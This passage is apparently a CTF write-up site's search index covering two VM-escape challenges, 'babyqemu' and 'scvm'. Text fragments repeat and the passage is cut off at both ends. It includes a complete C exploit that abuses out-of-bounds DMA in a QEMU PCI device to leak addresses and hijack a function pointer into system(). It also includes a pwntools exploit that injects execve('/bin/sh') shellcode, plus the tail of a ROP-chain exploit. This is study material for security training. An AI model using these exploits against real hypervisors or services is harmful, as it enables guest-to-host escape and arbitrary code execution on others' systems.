asm(pwnlib.shellcraft.amd64.linux.syscall( SYS_exit , 0)) ROP_CHAIN += code buy_house(6, 0x217, ROP_CHAIN) buy_house(7, 0x217, p64(malloc_hook) * 0x40) buy_super(p64(leave_ret) * 2) sell(1) buy_house(1, heap_base + 0x16a0 - 8, ROP_CHAIN, logging = True) p.interactive()","title":"EXP"},{"location":"pwn/VMEscape/BabyQemu/","text":"babyqemu Base knowledge can be found in QOM module analysis, etc. Analysis Launch cmd is shown here. ./qemu-system-x86_64 \\ -initrd ./rootfs.cpio \\ -kernel ./vmlinuz-4.8.0-52-generic \\ -append console=ttyS0 root=/dev/ram oops=panic panic=1 \\ -monitor /dev/null \\ -m 64M --nographic -L ./dependency/usr/local/share/qemu \\ -L pc-bios \\ -device hitb,id = vda In the qemu pci device mmio write callback function hitb_mmio_write(void *opaque, hwaddr addr, uint64_t val, unsigned int size) else if ( addr == 0x98 val 1 ! ( opaque - dma . cmd 1 ) ) { opaque - dma . cmd = val ; v7 = qemu_clock_get_ns ( QEMU_CLOCK_VIRTUAL_0 ); timer_mod ( opaque - dma_timer , (( signed __int64 )(( unsigned __int128 )( 0x431BDE82D7B634DBLL * ( signed __int128 ) v7 ) 64 ) 18 ) - ( v7 63 ) + 100 ); } It means we can set *((_QWORD *)opaque + 0x170) to the value we want. And in the function hitb_mmio_write , if we set this QWORD value, we can trigger some cpu_physical_memory_rw operation. if ( v1 2 ) { v2 = ( unsigned int )( LODWORD ( opaque - dma . src ) - 0x40000 ); if ( v1 4 ) { v7 = ( uint8_t * ) opaque - dma_buf [ v2 ]; (( void ( __fastcall * )( uint8_t * , _QWORD )) opaque - enc )( v7 , LODWORD ( opaque - dma . cnt )); v3 = v7 ; } else { v3 = ( uint8_t * ) opaque - dma_buf [ v2 ]; } cpu_physical_memory_rw ( opaque - dma . dst , v3 , opaque - dma . cnt , 1 ); v4 = opaque - dma . cmd ; v5 = opaque - dma . cmd 4 ; } The parameters of cpu_physical_memory_rw is defined as void __fastcall cpu_physical_memory_rw(hwaddr addr, uint8_t *buf, int len, int is_write); . So - opaque- dma.dst is the address if ( addr == 0x80 ) { if ( ! ( opaque - dma . cmd 1 ) ) opaque - dma . src = val ; } - v7 = (uint8_t *) opaque- dma_buf[v2]; is the buf - opaque- dma.cnt is the length //hitb_dma_timer if ( v1 4 ) { v7 = ( uint8_t * ) opaque - dma_buf [ v2 ]; (( void ( __fastcall * )( uint8_t * , _QWORD )) opaque - enc )( v7 , LODWORD ( opaque - dma . cnt )); v3 = v7 ; } else { v3 = ( uint8_t * ) opaque - dma_buf [ v2 ]; } - opaque- dma.cmd means read or write operation cpu_physical_memory_rw is the original qemu function. void cpu_physical_memory_rw ( hwaddr addr , uint8_t * buf , int len , int is_write ) { address_space_rw ( address_space_memory , addr , MEMTXATTRS_UNSPECIFIED , buf , len , is_write ); } vulnerability OOB Write We can find the call operation for cpu_physical_memory_rw here. if ( v1 2 ) { v2 = (unsigned int)(LODWORD(opaque- dma.src) - 0x40000); if ( v1 4 ) { v7 = (uint8_t *) opaque- dma_buf[v2]; ((void (__fastcall *)(uint8_t *, _QWORD))opaque- enc)(v7, LODWORD(opaque- dma.cnt)); v3 = v7; } else { v3 = (uint8_t *) opaque- dma_buf[v2]; } cpu_physical_memory_rw(opaque- dma.dst, v3, opaque- dma.cnt, 1); v4 = opaque- dma.cmd; v5 = opaque- dma.cmd 4; } This call process is shown as follows, which aims to do WRITE to the real virtual memory belonging to QEMU PROCESS by translating GUEST PADDR to HOST PROCESS VADDR. cpu_physical_memory_rw ( opaque - dma . dst , ( uint8_t * ) opaque - dma_buf [( unsigned int )( LODWORD ( opaque - dma . src ) - 0x40000 )], //OOB READ opaque - dma . cnt , 1 ); address_space_rw ( address_space_memory , opaque - dma . dst , 1 , ( uint8_t * ) opaque - dma_buf [( unsigned int )( LODWORD ( opaque - dma . src ) - 0x40000 )], //OOB READ opaque - dma . cnt , is_write != 0 ); address_space_write ( address_space_memory , opaque - dma . dst , 1 , ( uint8_t * ) opaque - dma_buf [( unsigned int )( LODWORD ( opaque - dma . src ) - 0x40000 )], //OOB READ opaque - dma . cnt ) v10 = address_space_translate ( address_space_memory , opaque - dma . dst , addr1 , l //l = opaque- dma.cnt, 1 ); v14 = qemu_map_ram_ptr ( v10 - ram_block , v27 ); //v27 == addr1 memcpy ( v14 , v5 , n ); // do memcpy operation So, we can copy an OOB READ memory to our process's physical address (opaque- dma.dst). LEAK CAN BE DONE THROUGH THIS VULN. OOB WRITE We can find the call operation for cpu_physical_memory_rw here, too. else { v6 = ( uint8_t * ) opaque [ 0xFFFFFFDBLL ]. dma_buf [( unsigned int ) opaque - dma . dst + 0x510 ]; LODWORD ( v3 ) = ( _DWORD ) opaque + opaque - dma . dst - 0x40000 + 0xBB8 ; /* ASM can be more explicit here .text:0000000000284120 mov rax, [rdi+0B70h] ; HitbState.dst .text:0000000000284127 mov edx, [hitb+0B78h] ; len .text:000000000028412D xor ecx, ecx ; is_write .text:000000000028412F sub eax, 40000h .text:0000000000284134 lea rbp, [rdi+rax+0BB8h] .text:000000000028413C mov rdi, [rdi+0B68h] ; addr .text:0000000000284143 mov rsi, rbp ; buf .text:0000000000284146 call cpu_physical_memory_rw */ cpu_physical_memory_rw ( opaque - dma . src , v6 , opaque - dma . cnt , 0 ); v4 = opaque - dma . cmd ; v5 = opaque - dma . cmd 4 ; if ( opaque - dma . cmd 4 ) { v3 = ( uint8_t * ) LODWORD ( opaque - dma . cnt ); (( void ( __fastcall * )( uint8_t * , uint8_t * , dma_addr_t )) opaque - enc )( v6 , v3 , v5 ); v4 = opaque - dma . cmd ; v5 = opaque - dma . cmd 4 ; } } opaque - dma . cmd = v4 0xFFFFFFFFFFFFFFFELL ; if ( v5 ) { opaque - irq_status |= 0x100u ; hitb_raise_irq ( opaque , ( uint32_t ) v3 ); } So, the parameter v6 of cpu_physical_memory_rw can make the read destination out of boundry. We can use it to overwrite the opaque- enc function pointer. And, opaque- dma.src will be translated from GUEST PADDR to HOST VADDR . So, we just need to set a paddr belonging to our process to set the source of this COPY operation. exploit #include stdio.h #include stdlib.h #include stdint.h #include unistd.h #include string.h #include errno.h #include signal.h #include fcntl.h #include ctype.h #include termios.h #include sys/types.h #include sys/mman.h #include assert.h #define PRINT_ERROR \\ do { \\ fprintf(stderr, Error at line %d, file %s (%d) [%s]\\n , \\ __LINE__, __FILE__, errno, strerror(errno)); exit(1); \\ } while(0) #define MAP_SIZE 4096UL #define MAP_MASK (MAP_SIZE - 1) int fd = - 1 ; char * filename = /sys/devices/pci0000:00/0000:00:04.0/resource0 ; //not used~ void pcimem_read ( uint64_t target , char access_type , uint64_t * read_result ) { /* Map one page */ void * map_base = mmap ( 0 , MAP_SIZE , PROT_READ | PROT_WRITE , MAP_SHARED , fd , target ~ MAP_MASK ); if ( map_base == ( void * ) - 1 ) PRINT_ERROR ; printf ( PCI Memory mapped to address 0x%08lx. \\n , ( unsigned long ) map_base ); void * virt_addr = map_base + ( target MAP_MASK ); int type_width = 0 ; switch ( access_type ) { case b : * read_result = * (( uint8_t * ) virt_addr ); type_width = 1 ; break ; case h : * read_result = * (( uint16_t * ) virt_addr ); type_width = 2 ; break ; case w : * read_result = * (( uint32_t * ) virt_addr ); type_width = 4 ; break ; case d : * read_result = * (( uint64_t * ) virt_addr ); type_width = 8 ; break ; } printf ( Value at offset 0x%X (%p): 0x%0*lX \\n , ( int ) target , virt_addr , type_width * 2 , * read_result ); if ( munmap ( map_base , MAP_SIZE ) == - 1 ) PRINT_ERROR ; } void pcimem_write ( uint64_t target , char access_type , uint64_t writeval ) { /* Map one page */ void * map_base = mmap ( 0 , MAP_SIZE , PROT_READ | PROT_WRITE , MAP_SHARED , fd , target ~ MAP_MASK ); if ( map_base == ( void * ) - 1 ) PRINT_ERROR ; printf ( PCI Memory mapped to address 0x%08lx. \\n , ( unsigned long ) map_base ); uint64_t read_result = 0 ; int type_width = 0 ; void * virt_addr = map_base + ( target MAP_MASK ); switch ( access_type ) { case b : * (( uint8_t * ) virt_addr ) = writeval ; read_result = * (( uint8_t * ) virt_addr ); type_width = 1 ; break ; case h : * (( uint16_t * ) virt_addr ) = writeval ; read_result = * (( uint16_t * ) virt_addr ); type_width = 2 ; break ; case w : * (( uint32_t * ) virt_addr ) = writeval ; read_result = * (( uint32_t * ) virt_addr ); type_width = 4 ; break ; case d : * (( uint64_t * ) virt_addr ) = writeval ; read_result = * (( uint64_t * ) virt_addr ); type_width = 8 ; break ; } //readback not correct? printf ( Written 0x%0*lX; readback 0x%*lX \\n , type_width , writeval , type_width , read_result ); if ( munmap ( map_base , MAP_SIZE ) == - 1 ) PRINT_ERROR ; } uint64_t virt2phys ( void * p ) { uint64_t virt = ( uint64_t ) p ; // Assert page alignment assert (( virt 0xfff ) == 0 ); int fd = open ( /proc/self/pagemap , O_RDONLY ); if ( fd == - 1 ) PRINT_ERROR ; uint64_t offset = ( virt / 0x1000 ) * 8 ; lseek ( fd , offset , SEEK_SET ); uint64_t phys ; if ( read ( fd , phys , 8 ) != 8 ) PRINT_ERROR ; // Assert page present assert ( phys ( 1ULL 63 )); phys = ( phys (( 1ULL 54 ) - 1 )) * 0x1000 ; return phys ; } int main () { if (( fd = open ( filename , O_RDWR | O_SYNC )) == - 1 ) PRINT_ERROR ; //for dma read and write void * dma_addr = mmap ( 0 , MAP_SIZE , PROT_READ | PROT_WRITE , MAP_SHARED | MAP_ANONYMOUS , - 1 , 0 ); if ( dma_addr == ( void * ) - 1 ) PRINT_ERROR ; // lock the dma_addr from hw mem mlock ( dma_addr , 0x1000 ); void * dma_phy_addr = ( void * ) virt2phys ( dma_addr ); //Step 1 // leak code base //set dma.src pcimem_write ( 0x80 , d , ( uint64_t )( 0x40000 + 0x1000 )); //set dma.dst pcimem_write ( 0x88 , d , ( uint64_t ) dma_phy_addr ); //set cnt pcimem_write ( 0x90 , d , 8 ); //set cmd to write pcimem_write ( 0x98 , d , 2 | 1 ); //wait for timer being triggered. sleep ( 1 ); uint64_t enc_address = * ( uint64_t * ) dma_addr ; printf ( enc_address (host vaddr) -- 0x%016lx \\n , enc_address ); uint64_t code_base = enc_address - 0x283DD0 ; uint64_t system_addr = code_base + 0x1FDB18 ; * ( uint64_t * ) dma_addr = system_addr ; //Step 2 //overwrite function pointer //set dma.src pcimem_write ( 0x80 , d , ( uint64_t ) dma_phy_addr ); //set dma.dst //.text:0000000000284120 mov rax, [rdi+0B70h] ; dst //.text:0000000000284127 mov edx, [hitb+0B78h] ; len //.text:000000000028412D xor ecx, ecx ; is_write //.text:000000000028412F sub eax, 40000h //.text:0000000000284134 lea rbp, [rdi+rax+0BB8h] //.text:000000000028413C mov rdi, [rdi+0B68h] ; addr //.text:0000000000284143 mov rsi, rbp ; buf //.text:0000000000284146 call cpu_physical_memory_rw pcimem_write ( 0x88 , d , ( uint64_t )( 0x40000 + 0x1000 )); //set cnt pcimem_write ( 0x90 , d , 8 ); //set cmd read //read sys_addr to HitbState- enc function pointer pcimem_write ( 0x98 , d , 1 ); sleep ( 1 ); //Step3 //prepare a parameter for system and trigger it strcpy (( char * )( dma_addr ) + 0x10 , deepin-calculator ); //set dma.src to the paddr of dma pcimem_write ( 0x80 , d , ( uint64_t ) dma_phy_addr + 0x10 ); //set dma.dst to the buf of device Hitb pcimem_write ( 0x88 , d , ( uint64_t )( 0x40000 )); //set cnt pcimem_write ( 0x90 , d , 18 ); //set cmd read //read sys_addr to HitbState- enc function pointer pcimem_write ( 0x98 , d , 1 | 4 ); sleep ( 1 ); return 0 ; }","title":"babyqemu"},{"location":"pwn/VMEscape/BabyQemu/#babyqemu","text":"Base knowledge can be found in QOM module analysis, etc.","title":"babyqemu"},{"location":"pwn/VMEscape/BabyQemu/#analysis","text":"Launch cmd is shown here. ./qemu-system-x86_64 \\ -initrd ./rootfs.cpio \\ -kernel ./vmlinuz-4.8.0-52-generic \\ -append console=ttyS0 root=/dev/ram oops=panic panic=1 \\ -monitor /dev/null \\ -m 64M --nographic -L ./dependency/usr/local/share/qemu \\ -L pc-bios \\ -device hitb,id = vda In the qemu pci device mmio write callback function hitb_mmio_write(void *opaque, hwaddr addr, uint64_t val, unsigned int size) else if ( addr == 0x98 val 1 ! ( opaque - dma . cmd 1 ) ) { opaque - dma . cmd = val ; v7 = qemu_clock_get_ns ( QEMU_CLOCK_VIRTUAL_0 ); timer_mod ( opaque - dma_timer , (( signed __int64 )(( unsigned __int128 )( 0x431BDE82D7B634DBLL * ( signed __int128 ) v7 ) 64 ) 18 ) - ( v7 63 ) + 100 ); } It means we can set *((_QWORD *)opaque + 0x170) to the value we want. And in the function hitb_mmio_write , if we set this QWORD value, we can trigger some cpu_physical_memory_rw operation. if ( v1 2 ) { v2 = ( unsigned int )( LODWORD ( opaque - dma . src ) - 0x40000 ); if ( v1 4 ) { v7 = ( uint8_t * ) opaque - dma_buf [ v2 ]; (( void ( __fastcall * )( uint8_t * , _QWORD )) opaque - enc )( v7 , LODWORD ( opaque - dma . cnt )); v3 = v7 ; } else { v3 = ( uint8_t * ) opaque - dma_buf [ v2 ]; } cpu_physical_memory_rw ( opaque - dma . dst , v3 , opaque - dma . cnt , 1 ); v4 = opaque - dma . cmd ; v5 = opaque - dma . cmd 4 ; } The parameters of cpu_physical_memory_rw is defined as void __fastcall cpu_physical_memory_rw(hwaddr addr, uint8_t *buf, int len, int is_write); . So - opaque- dma.dst is the address if ( addr == 0x80 ) { if ( ! ( opaque - dma . cmd 1 ) ) opaque - dma . src = val ; } - v7 = (uint8_t *) opaque- dma_buf[v2]; is the buf - opaque- dma.cnt is the length //hitb_dma_timer if ( v1 4 ) { v7 = ( uint8_t * ) opaque - dma_buf [ v2 ]; (( void ( __fastcall * )( uint8_t * , _QWORD )) opaque - enc )( v7 , LODWORD ( opaque - dma . cnt )); v3 = v7 ; } else { v3 = ( uint8_t * ) opaque - dma_buf [ v2 ]; } - opaque- dma.cmd means read or write operation cpu_physical_memory_rw is the original qemu function. void cpu_physical_memory_rw ( hwaddr addr , uint8_t * buf , int len , int is_write ) { address_space_rw ( address_space_memory , addr , MEMTXATTRS_UNSPECIFIED , buf , len , is_write ); }","title":"Analysis"},{"location":"pwn/VMEscape/BabyQemu/#vulnerability","text":"","title":"vulnerability"},{"location":"pwn/VMEscape/BabyQemu/#oob-write","text":"We can find the call operation for cpu_physical_memory_rw here. if ( v1 2 ) { v2 = (unsigned int)(LODWORD(opaque- dma.src) - 0x40000); if ( v1 4 ) { v7 = (uint8_t *) opaque- dma_buf[v2]; ((void (__fastcall *)(uint8_t *, _QWORD))opaque- enc)(v7, LODWORD(opaque- dma.cnt)); v3 = v7; } else { v3 = (uint8_t *) opaque- dma_buf[v2]; } cpu_physical_memory_rw(opaque- dma.dst, v3, opaque- dma.cnt, 1); v4 = opaque- dma.cmd; v5 = opaque- dma.cmd 4; } This call process is shown as follows, which aims to do WRITE to the real virtual memory belonging to QEMU PROCESS by translating GUEST PADDR to HOST PROCESS VADDR. cpu_physical_memory_rw ( opaque - dma . dst , ( uint8_t * ) opaque - dma_buf [( unsigned int )( LODWORD ( opaque - dma . src ) - 0x40000 )], //OOB READ opaque - dma . cnt , 1 ); address_space_rw ( address_space_memory , opaque - dma . dst , 1 , ( uint8_t * ) opaque - dma_buf [( unsigned int )( LODWORD ( opaque - dma . src ) - 0x40000 )], //OOB READ opaque - dma . cnt , is_write != 0 ); address_space_write ( address_space_memory , opaque - dma . dst , 1 , ( uint8_t * ) opaque - dma_buf [( unsigned int )( LODWORD ( opaque - dma . src ) - 0x40000 )], //OOB READ opaque - dma . cnt ) v10 = address_space_translate ( address_space_memory , opaque - dma . dst , addr1 , l //l = opaque- dma.cnt, 1 ); v14 = qemu_map_ram_ptr ( v10 - ram_block , v27 ); //v27 == addr1 memcpy ( v14 , v5 , n ); // do memcpy operation So, we can copy an OOB READ memory to our process's physical address (opaque- dma.dst). LEAK CAN BE DONE THROUGH THIS VULN.","title":"OOB Write"},{"location":"pwn/VMEscape/BabyQemu/#oob-write_1","text":"We can find the call operation for cpu_physical_memory_rw here, too. else { v6 = ( uint8_t * ) opaque [ 0xFFFFFFDBLL ]. dma_buf [( unsigned int ) opaque - dma . dst + 0x510 ]; LODWORD ( v3 ) = ( _DWORD ) opaque + opaque - dma . dst - 0x40000 + 0xBB8 ; /* ASM can be more explicit here .text:0000000000284120 mov rax, [rdi+0B70h] ; HitbState.dst .text:0000000000284127 mov edx, [hitb+0B78h] ; len .text:000000000028412D xor ecx, ecx ; is_write .text:000000000028412F sub eax, 40000h .text:0000000000284134 lea rbp, [rdi+rax+0BB8h] .text:000000000028413C mov rdi, [rdi+0B68h] ; addr .text:0000000000284143 mov rsi, rbp ; buf .text:0000000000284146 call cpu_physical_memory_rw */ cpu_physical_memory_rw ( opaque - dma . src , v6 , opaque - dma . cnt , 0 ); v4 = opaque - dma . cmd ; v5 = opaque - dma . cmd 4 ; if ( opaque - dma . cmd 4 ) { v3 = ( uint8_t * ) LODWORD ( opaque - dma . cnt ); (( void ( __fastcall * )( uint8_t * , uint8_t * , dma_addr_t )) opaque - enc )( v6 , v3 , v5 ); v4 = opaque - dma . cmd ; v5 = opaque - dma . cmd 4 ; } } opaque - dma . cmd = v4 0xFFFFFFFFFFFFFFFELL ; if ( v5 ) { opaque - irq_status |= 0x100u ; hitb_raise_irq ( opaque , ( uint32_t ) v3 ); } So, the parameter v6 of cpu_physical_memory_rw can make the read destination out of boundry. We can use it to overwrite the opaque- enc function pointer. And, opaque- dma.src will be translated from GUEST PADDR to HOST VADDR . So, we just need to set a paddr belonging to our process to set the source of this COPY operation.","title":"OOB WRITE"},{"location":"pwn/VMEscape/BabyQemu/#exploit","text":"#include stdio.h #include stdlib.h #include stdint.h #include unistd.h #include string.h #include errno.h #include signal.h #include fcntl.h #include ctype.h #include termios.h #include sys/types.h #include sys/mman.h #include assert.h #define PRINT_ERROR \\ do { \\ fprintf(stderr, Error at line %d, file %s (%d) [%s]\\n , \\ __LINE__, __FILE__, errno, strerror(errno)); exit(1); \\ } while(0) #define MAP_SIZE 4096UL #define MAP_MASK (MAP_SIZE - 1) int fd = - 1 ; char * filename = /sys/devices/pci0000:00/0000:00:04.0/resource0 ; //not used~ void pcimem_read ( uint64_t target , char access_type , uint64_t * read_result ) { /* Map one page */ void * map_base = mmap ( 0 , MAP_SIZE , PROT_READ | PROT_WRITE , MAP_SHARED , fd , target ~ MAP_MASK ); if ( map_base == ( void * ) - 1 ) PRINT_ERROR ; printf ( PCI Memory mapped to address 0x%08lx. \\n , ( unsigned long ) map_base ); void * virt_addr = map_base + ( target MAP_MASK ); int type_width = 0 ; switch ( access_type ) { case b : * read_result = * (( uint8_t * ) virt_addr ); type_width = 1 ; break ; case h : * read_result = * (( uint16_t * ) virt_addr ); type_width = 2 ; break ; case w : * read_result = * (( uint32_t * ) virt_addr ); type_width = 4 ; break ; case d : * read_result = * (( uint64_t * ) virt_addr ); type_width = 8 ; break ; } printf ( Value at offset 0x%X (%p): 0x%0*lX \\n , ( int ) target , virt_addr , type_width * 2 , * read_result ); if ( munmap ( map_base , MAP_SIZE ) == - 1 ) PRINT_ERROR ; } void pcimem_write ( uint64_t target , char access_type , uint64_t writeval ) { /* Map one page */ void * map_base = mmap ( 0 , MAP_SIZE , PROT_READ | PROT_WRITE , MAP_SHARED , fd , target ~ MAP_MASK ); if ( map_base == ( void * ) - 1 ) PRINT_ERROR ; printf ( PCI Memory mapped to address 0x%08lx. \\n , ( unsigned long ) map_base ); uint64_t read_result = 0 ; int type_width = 0 ; void * virt_addr = map_base + ( target MAP_MASK ); switch ( access_type ) { case b : * (( uint8_t * ) virt_addr ) = writeval ; read_result = * (( uint8_t * ) virt_addr ); type_width = 1 ; break ; case h : * (( uint16_t * ) virt_addr ) = writeval ; read_result = * (( uint16_t * ) virt_addr ); type_width = 2 ; break ; case w : * (( uint32_t * ) virt_addr ) = writeval ; read_result = * (( uint32_t * ) virt_addr ); type_width = 4 ; break ; case d : * (( uint64_t * ) virt_addr ) = writeval ; read_result = * (( uint64_t * ) virt_addr ); type_width = 8 ; break ; } //readback not correct? printf ( Written 0x%0*lX; readback 0x%*lX \\n , type_width , writeval , type_width , read_result ); if ( munmap ( map_base , MAP_SIZE ) == - 1 ) PRINT_ERROR ; } uint64_t virt2phys ( void * p ) { uint64_t virt = ( uint64_t ) p ; // Assert page alignment assert (( virt 0xfff ) == 0 ); int fd = open ( /proc/self/pagemap , O_RDONLY ); if ( fd == - 1 ) PRINT_ERROR ; uint64_t offset = ( virt / 0x1000 ) * 8 ; lseek ( fd , offset , SEEK_SET ); uint64_t phys ; if ( read ( fd , phys , 8 ) != 8 ) PRINT_ERROR ; // Assert page present assert ( phys ( 1ULL 63 )); phys = ( phys (( 1ULL 54 ) - 1 )) * 0x1000 ; return phys ; } int main () { if (( fd = open ( filename , O_RDWR | O_SYNC )) == - 1 ) PRINT_ERROR ; //for dma read and write void * dma_addr = mmap ( 0 , MAP_SIZE , PROT_READ | PROT_WRITE , MAP_SHARED | MAP_ANONYMOUS , - 1 , 0 ); if ( dma_addr == ( void * ) - 1 ) PRINT_ERROR ; // lock the dma_addr from hw mem mlock ( dma_addr , 0x1000 ); void * dma_phy_addr = ( void * ) virt2phys ( dma_addr ); //Step 1 // leak code base //set dma.src pcimem_write ( 0x80 , d , ( uint64_t )( 0x40000 + 0x1000 )); //set dma.dst pcimem_write ( 0x88 , d , ( uint64_t ) dma_phy_addr ); //set cnt pcimem_write ( 0x90 , d , 8 ); //set cmd to write pcimem_write ( 0x98 , d , 2 | 1 ); //wait for timer being triggered. sleep ( 1 ); uint64_t enc_address = * ( uint64_t * ) dma_addr ; printf ( enc_address (host vaddr) -- 0x%016lx \\n , enc_address ); uint64_t code_base = enc_address - 0x283DD0 ; uint64_t system_addr = code_base + 0x1FDB18 ; * ( uint64_t * ) dma_addr = system_addr ; //Step 2 //overwrite function pointer //set dma.src pcimem_write ( 0x80 , d , ( uint64_t ) dma_phy_addr ); //set dma.dst //.text:0000000000284120 mov rax, [rdi+0B70h] ; dst //.text:0000000000284127 mov edx, [hitb+0B78h] ; len //.text:000000000028412D xor ecx, ecx ; is_write //.text:000000000028412F sub eax, 40000h //.text:0000000000284134 lea rbp, [rdi+rax+0BB8h] //.text:000000000028413C mov rdi, [rdi+0B68h] ; addr //.text:0000000000284143 mov rsi, rbp ; buf //.text:0000000000284146 call cpu_physical_memory_rw pcimem_write ( 0x88 , d , ( uint64_t )( 0x40000 + 0x1000 )); //set cnt pcimem_write ( 0x90 , d , 8 ); //set cmd read //read sys_addr to HitbState- enc function pointer pcimem_write ( 0x98 , d , 1 ); sleep ( 1 ); //Step3 //prepare a parameter for system and trigger it strcpy (( char * )( dma_addr ) + 0x10 , deepin-calculator ); //set dma.src to the paddr of dma pcimem_write ( 0x80 , d , ( uint64_t ) dma_phy_addr + 0x10 ); //set dma.dst to the buf of device Hitb pcimem_write ( 0x88 , d , ( uint64_t )( 0x40000 )); //set cnt pcimem_write ( 0x90 , d , 18 ); //set cmd read //read sys_addr to HitbState- enc function pointer pcimem_write ( 0x98 , d , 1 | 4 ); sleep ( 1 ); return 0 ; }","title":"exploit"},{"location":"pwn/VMEscape/scvm/","text":"scvm huwangbei2019 offline An easy VM challenge. Compared with the system-level virtual machine topic, this kind of topic can be understood as customizing a CPU instruction set, and realizing the emulator of the instruction set, not the virtualization at the hardware system level. Reverse VM Struct It is really easy to know the struct of VM by analyzing the function as follows. 00000000 vm_t struc ; (sizeof=0x20, mappedto_8) 00000000 reg_cnt dd ? 00000004 fun_cnt dd ? 00000008 regs dq ? 00000010 funs dq ? ; base 2 00000018 mem dq ? 00000020 vm_t ends 00000020 Instruction Type Instructions are four byte long and byte-aligned. [fun_id] [val1] [val2] [val3] fun_id is used to know which function should be called. For example, instruction add use 3 vals and do the operation regs[val1] = regs[val2] + regs[val3] . Functions 10 functions are supported, but function lea is not useful. exit: exit(0) add: regs[val1] = regs[val2] + regs[val3] sub: regs[val1] = regs[val2] - regs[val3] mul: regs[val1] = regs[val2] * regs[val3] div: regs[val1] = regs[val2] / regs[val3] mod: regs[val1] = regs[val2] % regs[val3] mov: regs[val1] = val2 print: print(reg[val3]) lea: regs[val1] = (uint32_t)(vm- mem + val2) mov2mem: *(byte *)(vm- mem + val2) = regs[val1] Vulnerability Incomplete Checking We can input 0x1000 bytes as vm- mem . However, the check will only check 0x800 bytes, so we can bypass this check if we input malicious instructions after 0x800 bytes. self-modifying code It is obvious that instruction mov2mem can modify *(byte *)(vm- mem + val2) to the value of regs[val1] . But it does not check the value of val2. So, we can modify the value of a bytes in memory (0 ~ 0xff) to the value we want, static check makes no sense. Exploit It is enough to use Incomplete Checking for exploiting. Firstly, we input enough bytes (more than 0x800 ) to bypass static checking. payload = gen_sub(0x0, 0x0, 0x0) * (0x800 / 4) Leak We cannot leak address of vm- mem by original print like operations, because we can only input once. So, we need to leak vm- mem to a reg of this vm and use the instructions integrated into this vm ( sub or add is great). We the vm is inited, heap chunk for regs and funcs are allocated and then the struct vm is allocated, too. We can use sub to get the value of regs[0~0xff] . So, leak is done. We can also use this trick to modify the value of funs[i] to the one we like. However, remember that the operand size is 32 bits , not 64 bits. The arch of this executable elf is amd64 . So, we need to modify the value of a function ptr twice (low 32 bits and high 32 bits). Shellcode It is easy that the memory allocated for vm is marked as rwx , so we just need to set rip to the address of our vm mem. EXP from pwn import * local=1 pc= ./scvm aslr=True context.log_level=True context.arch = amd64 context.word_size = 64 context.os = linux context.endian = little if local==1: #p = process(pc,aslr=aslr,env={ LD_PRELOAD : ./libc.so.6 }) p = process(pc,aslr=aslr) gdb.attach(p) else: remote_addr=[ 172.16.9.45 , 17730] p=remote(remote_addr[0],remote_addr[1]) ru = lambda x : p.recvuntil(x) sn = lambda x : p.send(x) rl = lambda : p.recvline() sl = lambda x : p.sendline(x) rv = lambda x : p.recv(x) sa = lambda a,b : p.sendafter(a,b) sla = lambda a,b : p.sendlineafter(a,b) def lg(s,addr): print( \\033[1;31;40m%20s-- 0x%x\\033[0m %(s,addr)) def gen_print(i, j=0, k=0): s = s += chr(7) s += chr(i) s += chr(j) s += chr(k) return s def gen_mov(i, j, k = 0): s = s += chr(6) s += chr(i) s += chr(j) s += chr(k) return s def gen_sub(i, j, k): s = s += chr(2) s += chr(i) s += chr(j) s += chr(k) return s def gen_add(i, j, k): s = s += chr(1) s += chr(i) s += chr(j) s += chr(k) return s def raddr(a=6): if(a==6): return u64(rv(a).ljust(8, \\x00 )) else: return u64(rl().strip( \\n ).ljust(8, \\x00 )) if __name__ == __main__ : payload = gen_sub(0x0, 0x0, 0x0) * (0x800 / 4) payload+= gen_mov(0,0x80) payload+= gen_sub(2, 0x2e + 4, 2) payload+= gen_sub(3, 0x2f + 4, 3) for i in range(0, 0x12): payload+= gen_add(2, 0, 2) payload+= gen_sub(0x22, 0x22, 0x22) payload+= gen_sub(0x23, 0x23, 0x23) payload+= gen_sub(0x22, 0x2, 0x22) payload+= gen_sub(0x23, 0x3, 0x23) payload+= gen_print(0x10) payload = payload.ljust(0x900, \\x00 ) buf = buf += \\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73 buf += \\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x52\\x57\\x48\\x89 buf += \\xe6\\xb0\\x3b\\x0f\\x05 payload+= buf #payload = payload.ljust(0xa0, \\x00 ) #payload+= p32( 0x11DA - 0x10A0) sn(payload) p.interactive()","title":"scvm"},{"location":"pwn/VMEscape/scvm/#scvm","text":"huwangbei2019 offline An easy VM challenge. Compared with the system-level virtual machine topic, this kind of topic can be understood as customizing a CPU instruction set, and realizing the emulator of the instruction set, not the virtualization at the hardware system level.","title":"scvm"},{"location":"pwn/VMEscape/scvm/#reverse","text":"","title":"Reverse"},{"location":"pwn/VMEscape/scvm/#vm-struct","text":"It is really easy to know the struct of VM by analyzing the function as follows. 00000000 vm_t struc ; (sizeof=0x20, mappedto_8) 00000000 reg_cnt dd ? 00000004 fun_cnt dd ? 00000008 regs dq ? 00000010 funs dq ? ; base 2 00000018 mem dq ? 00000020 vm_t ends 00000020","title":"VM Struct"},{"location":"pwn/VMEscape/scvm/#instruction-type","text":"Instructions are four byte long and byte-aligned. [fun_id] [val1] [val2] [val3] fun_id is used to know which function should be called. For example, instruction add use 3 vals and do the operation regs[val1] = regs[val2] + regs[val3] .","title":"Instruction Type"},{"location":"pwn/VMEscape/scvm/#functions","text":"10 functions are supported, but function lea is not useful. exit: exit(0) add: regs[val1] = regs[val2] + regs[val3] sub: regs[val1] = regs[val2] - regs[val3] mul: regs[val1] = regs[val2] * regs[val3] div: regs[val1] = regs[val2] / regs[val3] mod: regs[val1] = regs[val2] % regs[val3] mov: regs[val1] = val2 print: print(reg[val3]) lea: regs[val1] = (uint32_t)(vm- mem + val2) mov2mem: *(byte *)(vm- mem + val2) = regs[val1]","title":"Functions"},{"location":"pwn/VMEscape/scvm/#vulnerability","text":"","title":"Vulnerability"},{"location":"pwn/VMEscape/scvm/#incomplete-checking","text":"We can input 0x1000 bytes as vm- mem . However, the check will only check 0x800 bytes, so we can bypass this check if we input malicious instructions after 0x800 bytes.","title":"Incomplete Checking"},{"location":"pwn/VMEscape/scvm/#self-modifying-code","text":"It is obvious that instruction mov2mem can modify *(byte *)(vm- mem + val2) to the value of regs[val1] . But it does not check the value of val2. So, we can modify the value of a bytes in memory (0 ~ 0xff) to the value we want, static check makes no sense.","title":"self-modifying code"},{"location":"pwn/VMEscape/scvm/#exploit","text":"It is enough to use Incomplete Checking for exploiting. Firstly, we input enough bytes (more than 0x800 ) to bypass 